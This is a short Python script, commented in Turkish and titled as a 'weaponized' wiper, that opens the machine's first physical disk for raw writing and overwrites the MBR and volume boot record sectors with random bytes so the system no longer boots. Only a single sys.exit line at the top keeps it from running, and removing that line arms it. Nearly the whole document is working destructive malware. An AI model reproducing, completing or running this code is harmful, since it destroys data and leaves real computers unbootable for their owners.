import sys
import os

# --- EMNİYET PİMİ ---
sys.exit("UYARI: BU KOD DİSKİ KULLANILAMAZ HALE GETİRİR (BRICK).")

print("--- WEAPONIZED MFT WIPER ---")

def kill_disk_layout():
    # 1. HEDEF: FİZİKSEL DİSK (Weaponized Part)
    # Simülasyon: "test.bin"
    # Gerçek: İşletim sisteminin kurulu olduğu disk.
    
    target = r"\\.\PhysicalDrive0"
    
    sectors_to_nuke = [
        0,    # MBR (Master Boot Record)
        2048, # VBR (Volume Boot Record - Genelde burada olur)
        # MFT (Master File Table) başlangıcı da hesaplanıp silinebilir
    ]
    
    try:
        with open(target, "wb") as f:
            for sector in sectors_to_nuke:
                print(f"[*] Sektör {sector} imha ediliyor...")
                f.seek(sector * 512)
                f.write(os.urandom(512)) # Rastgele çöp veri
                
        print("💀 DİSK YAPISI BOZULDU.")
        print("Bilgisayar yeniden başlatıldığında 'Boot Device Not Found' hatası verecek.")
        
    except PermissionError:
        print("[-] Yönetici yetkisi gerekli.")

if __name__ == "__main__":
    kill_disk_layout()